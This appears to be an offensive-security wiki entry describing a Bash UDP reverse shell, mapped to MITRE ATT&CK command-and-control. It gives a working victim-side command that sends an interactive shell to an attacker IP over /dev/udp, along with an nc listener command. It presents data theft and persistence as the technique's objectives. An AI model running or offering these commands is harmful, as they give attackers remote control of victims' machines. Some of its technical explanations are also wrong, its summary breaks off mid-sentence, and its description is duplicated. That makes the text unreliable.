---
id: 82c88ed3-e98e-4c4c-9245-615d630e6433
name: Bash UDP Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.178575+00:00'
updated_at: '2023-04-10T20:25:29.481605+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Non-Standard Port|T1571 - Non-Standard Port]]'
tags:
- '[[Bash UDP]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
commands:
- '[[Listener]]'
- '[[Reverse Shell]]'
---

# Bash UDP Reverse Shell

## Summary

A Bash UDP Reverse Shell is a technique used to establish a reverse shell connection between an attacker and a target machine. This technique involves sending a UDP packet from the target machine to the attacker's machine, which contains a bash command to establish a reverse shell connection. This 

## Description

# Description

A Bash UDP Reverse Shell is a technique used to establish a reverse shell connection between an attacker and a target machine. This technique involves sending a UDP packet from the target machine to the attacker's machine, which contains a bash command to establish a reverse shell connection. This technique can be used to bypass firewalls and other network security measures that may be in place. The business value of this technique is that it allows an attacker to gain remote access to a target machine and potentially steal sensitive data or perform other malicious actions.

## Requirements

1. Access to a target machine with Bash installed

1. Ability to send and receive UDP packets

1. Knowledge of the target machine's IP address and open UDP port

## Defense

1. Implement network segmentation to prevent attackers from accessing critical systems

1. Use firewalls and intrusion detection/prevention systems to monitor and block malicious UDP traffic

1. Regularly update and patch software to prevent known vulnerabilities from being exploited

## Objectives

1. Establish a reverse shell connection between an attacker and a target machine

1. Maintain persistence on a target machine

1. Steal sensitive data or perform other malicious actions on a target machine

# Instructions

1. To establish a reverse shell via UDP, run the following command on the victim machine:

sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Then, on the attacker machine, run the following command to listen for the connection:

nc -u -lvp 4242

**Code**: [[Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

List]]

> This command creates a reverse shell connection between the victim and attacker machines via UDP protocol. The 'sh' command is used to spawn a shell on the victim machine, which is then redirected to the specified IP address and port number using the '>&' operator. The '0>&1' operator is used to redirect the standard input, output, and error streams to the spawned shell. On the attacker machine, the 'nc' command is used to listen for the incoming connection from the victim machine. The '-u' option specifies that the connection should use UDP protocol, while '-lvp' specifies the port number to listen on and enables verbose output.

**Command** ([[Reverse Shell]]):

```bash
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```

**Command** ([[Listener]]):

```bash
nc -u -lvp 4242
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Non-Standard Port|T1571 - Non-Standard Port]]

## Commands Used

- [[Listener]]
- [[Reverse Shell]]

## Tags

- [[Bash UDP]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
